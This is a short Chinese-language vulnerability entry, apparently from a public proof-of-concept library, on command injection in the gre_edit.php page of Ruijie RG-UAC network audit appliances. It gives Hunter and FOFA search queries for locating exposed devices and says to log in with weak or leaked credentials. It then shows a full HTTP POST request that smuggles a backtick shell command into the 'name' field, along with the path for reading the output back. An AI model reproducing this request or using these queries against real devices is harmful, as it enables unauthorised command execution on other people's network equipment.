# 锐捷RG-UAC统一上网行为管理审计系统gre_edit后台命令执行漏洞

# 一、漏洞简介
锐捷RG-UAC统一上网行为管理审计系统存在账号密码信息泄露,可以间接获取用户账号密码信息登录后台 。

# 二、影响版本
+ 锐捷RG-UAC统一上网行为管理审计系统

# 三、资产测绘
+ hunter`app.name="Ruijie 锐捷 RG-UAC"`
+ fofoa:`app="Ruijie-RG-UAC"`

登录页


# 四、漏洞复现
使用弱口令/敏感信息泄露漏洞登录系统后台


获取Cookie后使用下面poc

```plain
POST /view/networkConfig/GRE/gre_edit.php HTTP/1.1
Host: 
Cookie: PHPSESSID=ae63a240e1fdfb5614107040d19120f3
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Content-Length: 17

name=`pwd+>1.txt`
```


```plain
/view/networkConfig/GRE/1.txt
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/yig773u39hvi17q6>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
